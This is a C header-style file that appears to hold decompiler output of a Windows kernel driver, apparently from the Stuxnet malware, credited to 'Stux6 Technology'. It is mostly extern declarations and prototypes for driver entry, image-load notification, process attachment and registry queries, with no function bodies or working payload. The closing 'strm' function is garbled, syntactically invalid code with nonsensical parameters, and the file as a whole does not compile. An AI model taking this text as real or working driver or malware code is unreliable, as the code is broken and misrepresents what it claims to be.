/* 
* Copyriht (c) 2026 Stux6 Technology
* by; Alperen ERKAN - Lead Engineer at Stux6 Technology
* info: erkanalperen54 [at] gmail.com
*
*LINK - www.github.com/Stux6-Technology/StuxNet
*
*NOTE - This script on test file... Read of `UUN29.md` document
*/

#include <windows.h>
#include <defs.h>
#include <UUN29.h>

extern const WCHAR aSystemrootSyst[]; // idb
extern const WCHAR aRtlgetversion[]; // idb
extern const WCHAR aKeareallapcsdi[]; // idb
extern wchar_t aKernel32_dll[13]; // weak
extern char dword_12300[]; // idb
extern char dword_12310[]; // idb
// extern PBOOLEAN KdDebuggerEnabled;
// extern void *InitSafeBootMode; weak
extern int dword_12420; // weak
extern char byte_12428[]; // weak
extern _BYTE byte_1243C[20]; // idb
extern int dword_12450; // weak
extern char a_text[6]; // weak
extern char aPage[5]; // weak
extern char asc_12470[2]; // weak
extern size_t dword_12478; // idb
extern int dword_1247C; // weak
extern int dword_12480; // weak
extern int dword_12484; // weak
extern int dword_12488; // weak
extern _UNKNOWN unk_1248C; // weak
extern _UNKNOWN unk_12D30; // weak
extern _UNKNOWN unk_13E80; // weak
extern _UNKNOWN unk_13E84; // weak
extern char byte_13E88; // weak
extern char byte_13E89; // weak
extern char byte_13E8A; // weak
extern char byte_13E8B; // weak
extern char byte_13E98; // weak
extern int dword_13E99; // weak
extern const WCHAR word_13E9D; // idb
extern const WCHAR word_13F65; // idb
extern const WCHAR word_13F79; // idb
extern int dword_14041; // weak
extern int dword_14045; // weak
extern const WCHAR SourceString; // idb
extern int dword_14118; // weak
extern int dword_1411C; // weak
extern int dword_14120; // weak
extern char byte_14124; // weak
extern int dword_14128; // weak
extern int dword_1412C; // weak
extern int dword_14130; // weak
extern int dword_14134; // weak
extern int dword_14138; // weak
extern RTL_GENERIC_TABLE Table; // idb
extern int dword_14164; // weak
extern char byte_14168; // weak
extern int dword_1416C; // weak
extern int dword_14170; // weak
extern char byte_14174; // weak
extern int dword_14178; // weak
extern int dword_1417C; // weak
extern int dword_14180; // weak
extern int dword_14184; // weak

//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

char __cdecl sub_10300();
void __stdcall DriverReinitializationRoutine(PDRIVER_OBJECT DriverObject, int a2, unsigned int a3);
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
int __stdcall sub_104C8(int a1);
int __cdecl sub_10580();
// int __usercall sub_105A8<eax>(int a1<esi>);
// int __userpurge sub_105DA<eax>(int a1<ebx>, SIZE_T a2<edi>, int a3<esi>, const void *a4);
// int __usercall sub_1061E<eax>(LSA_UNICODE_STRING *a1<ecx>, int a2<edi>, int a3<esi>);
ULONG __thiscall sub_10672(LSA_UNICODE_STRING *this, ULONG a2, int a3);
// void __userpurge sub_107A8(int a1<ebx>, PVOID *a2);
signed int __fastcall sub_107DC(int a1, int a2);
int *__cdecl sub_10822();
bool __stdcall sub_1089A(int a1);
int __cdecl sub_108D2();
// int __usercall sub_10922<eax>(int a1<edi>, int *a2<esi>);
// int __usercall sub_1097A<eax>(int a1<ecx>, int a2<esi>);
// int __usercall sub_109B6<eax>(int a1<esi>);
int __stdcall sub_109E8(int, PIRP Irp); // idb
int __stdcall sub_10A04(int, PIRP Irp); // idb
// unsigned int __usercall sub_10A7A<eax>(int a1<eax>);
// void __usercall sub_10B28(int a1<eax>);
// int __usercall sub_10B52<eax>(int a1<ecx>, int a2<edi>, int a3<esi>);
int __stdcall sub_10B76(int, HANDLE Handle, int); // idb
KIRQL __stdcall NotifyRoutine(int a1, HANDLE Handle, int a3);
// int __userpurge sub_10D4A<eax>(int result<eax>, int a2);
RTL_GENERIC_TABLE *__cdecl sub_10D6C();
// PVOID __usercall sub_10DAE<eax>(int a1<eax>, RTL_GENERIC_TABLE *a2<edi>);
// signed int __usercall sub_10DEC<eax>(int a1<eax>, RTL_GENERIC_TABLE *a2<edi>);
// signed int __userpurge sub_10E46<eax>(RTL_GENERIC_TABLE *a1<eax>, int *a2);
bool __stdcall CompareRoutine(int a1, int a2, int a3);
PVOID __stdcall AllocateRoutine(int a1, SIZE_T NumberOfBytes);
void __stdcall FreeRoutine(int a1, PVOID P);
// int __usercall sub_10F10<eax>(int a1<ebx>, int a2<esi>);
// int __userpurge sub_10F3A<eax>(int a1<eax>, int a2<ebx>, int a3);
// signed int __userpurge sub_10FC8<eax>(int a1<eax>, int a2, int a3);
// PVOID __userpurge sub_11146<eax>(int a1<edi>, int a2, int a3);
// void __userpurge sub_111A2(int a1<eax>, int a2<ecx>, int a3<ebx>, int a4, int a5);
void __fastcall sub_11270(int a1, int a2, int a3, int a4, int a5);
LONG_PTR __stdcall sub_112A6(int a1, int a2, int a3, int a4, int a5);
PVOID __stdcall sub_112FC(int a1);
PVOID __stdcall sub_1131C(int a1);
// signed int __userpurge sub_11350<eax>(const void *a1<eax>, int a2<ebx>, int a3);
signed int __thiscall sub_11498(int this, int a2, const void *a3);
__int32 __stdcall sub_114CA(int a1, int a2);
// char __usercall sub_11528<al>(WCHAR *a1<eax>, int a2<ecx>);
// PVOID __usercall sub_115AC<eax>(ULONG a1<esi>);
// int __usercall sub_115E4<eax>(HANDLE *a1<edi>);
signed int __stdcall sub_11662(unsigned int a1, int a2);
char __fastcall sub_1172E(int a1, int a2);
// char __usercall sub_11788<al>(int a1<edi>);
// int __userpurge sub_117CA<eax>(int a1<eax>, int a2<ebx>, unsigned int a3);
// const char *__usercall sub_1183C<eax>(const char *result<eax>, int a2<ecx>);
int __stdcall sub_11884(int a1, const char *a2, unsigned int a3, int a4, int a5);
int *__cdecl sub_11994();
int __stdcall sub_11A48(int a1);
char __stdcall sub_11AC2(int a1, unsigned int a2);
// NTSTATUS __userpurge sub_11ADE<eax>(LSA_UNICODE_STRING *a1<eax>, PUNICODE_STRING ValueName, int a3);
int __stdcall sub_11B52(int, PUNICODE_STRING ValueName, int); // idb
// int __usercall sub_11C42<eax>(char a1<al>, int a2<ecx>, unsigned int a3<esi>);
int __stdcall sub_11CBE(int, int, HANDLE Handle); // idb
// int __userpurge sub_11D3C<eax>(int a1<esi>, int a2, int a3);
int __stdcall sub_11D7C(const char *a1);
int __cdecl sub_11E4C();
int __stdcall sub_11E6E(HANDLE Handle, PVOID ProcessInformation); // idb
// int __userpurge sub_11F02<eax>(int a1<ebx>, int a2<edi>, int a3);
// LONG_PTR __usercall sub_11F3A<eax>(PVOID Object<ecx>, LONG_PTR result<eax>);
signed int __cdecl sub_11F4C(int a1, int a2);
int __cdecl sub_12017(int a1, unsigned int a2);
int __cdecl sub_1202D(int a1, unsigned int a2, int a3, int a4);
int __cdecl sub_12079(int a1);
int __fastcall sub_120AA(int a1, int a2, int a3, int a4, unsigned __int16 a5);
int __cdecl sub_120E9(int a1, unsigned int a2);
int __cdecl sub_12145(int a1, int a2);
// NTSTATUS __stdcall ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
// void *__cdecl memcpy(void *, const void *, size_t);
// void *__cdecl memset(void *, int, size_t);
int nullsub_1(); // weak
int nullsub_2(); // weak
int sub_12322(); // weak
int nullsub_3(); // weak
// KIRQL __fastcall KfAcquireSpinLock(PKSPIN_LOCK SpinLock);
// KIRQL __stdcall KeGetCurrentIrql();
// void __fastcall KfReleaseSpinLock(PKSPIN_LOCK SpinLock, KIRQL NewIrql);
// NTSTATUS __stdcall ZwReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
// NTSTATUS __stdcall ZwClose(HANDLE Handle);
// NTSTATUS __stdcall ZwOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
// NTSTATUS __stdcall ZwQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
// PVOID __stdcall MmGetSystemRoutineAddress(PUNICODE_STRING SystemRoutineName);
// BOOLEAN __stdcall PsGetVersion(PULONG MajorVersion, PULONG MinorVersion, PULONG BuildNumber, PUNICODE_STRING CSDVersion);
// NTSTATUS __stdcall PsSetLoadImageNotifyRoutine(PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine);
// PVOID __stdcall ExAllocatePool(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
// NTSTATUS __stdcall IoCreateDevice(PDRIVER_OBJECT DriverObject, ULONG DeviceExtensionSize, PUNICODE_STRING DeviceName, ULONG DeviceType, ULONG DeviceCharacteristics, BOOLEAN Exclusive, PDEVICE_OBJECT *DeviceObject);
// BOOLEAN __stdcall RtlDeleteElementGenericTable(PRTL_GENERIC_TABLE Table, PVOID Buffer);
// PKTHREAD __stdcall KeGetCurrentThread();
// PVOID __stdcall RtlLookupElementGenericTable(PRTL_GENERIC_TABLE Table, PVOID Buffer);
// void __stdcall RtlInitializeGenericTable(PRTL_GENERIC_TABLE Table, PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine, PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine, PRTL_GENERIC_FREE_ROUTINE FreeRoutine, PVOID TableContext);
// PVOID __stdcall RtlInsertElementGenericTable(PRTL_GENERIC_TABLE Table, PVOID Buffer, CLONG BufferSize, PBOOLEAN NewElement);
// WCHAR __stdcall RtlUpcaseUnicodeChar(WCHAR SourceCharacter);
// NTSTATUS __stdcall ZwAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, PULONG AllocationSize, ULONG AllocationType, ULONG Protect);
// void __stdcall RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
// void __stdcall IoRegisterDriverReinitialization(PDRIVER_OBJECT DriverObject, PDRIVER_REINITIALIZE DriverReinitializationRoutine, PVOID Context);
// void __fastcall IofCompleteRequest(PIRP Irp, CCHAR PriorityBoost);
// void __stdcall ExFreePoolWithTag(PVOID P, ULONG Tag);
// NTSTATUS __stdcall ZwQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
// NTSTATUS __stdcall ZwOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
// int __stdcall KeUnstackDetachProcess(_DWORD); weak
// int __stdcall KeStackAttachProcess(_DWORD, _DWORD); weak
// int __cdecl stricmp(const char *, const char *);
// NTSTATUS __stdcall ZwQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
// int __stdcall ObOpenObjectByPointer(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall PsLookupProcessByProcessId(_DWORD, _DWORD); weak
// LONG_PTR __fastcall ObfDereferenceObject(PVOID Object);
// signed int __usercall sub_1281C<eax>(int a1<esi>);
signed int __cdecl sub_128A9(int a1);
// bool __usercall sub_12B92<eax>(int a1<eax>, int a2);
int __thiscall sub_12BCC(void *this);
// signed int __usercall sub_13179<eax>(int a1<eax>, unsigned int a2);
// int __usercall sub_131F5<eax>(int a1<esi>, int a2, int a3, int a4);
// int __usercall sub_13323<eax>(unsigned int *a1<eax>, int a2<ecx>, int a3<ebx>, int a4, int a5, int a6);
int __thiscall sub_13447(void *this);
signed int __cdecl sub_1347D(int a1, int a2);
int __cdecl sub_13548(int a1, unsigned int a2);
int __cdecl sub_1355E(int a1, unsigned int a2, int a3, int a4);
int __cdecl sub_135AA(int a1);
int __fastcall sub_136C7(int a1, int a2, int a3, int a4, unsigned __int16 a5);
// int __usercall sub_137AD<eax>(unsigned int a1<eax>, int a2<ecx>, int a3, int a4, int a5);
// signed int __usercall sub_13822<eax>(int a1<eax>, int a2<edx>, int a3<ecx>, unsigned int a4);
// signed int __usercall sub_138DF<eax>(int a1<eax>, int a2, int a3, unsigned int a4, int (__cdecl *a5)(_DWORD, _DWORD, _DWORD));


void strm(_MIGRATE_I2P *DNNM, unsigned int 16m[64], i*---n1, *m uint16_t); // 16µM/s
{
    unsigned char NULL_t[0];
    // if / else
}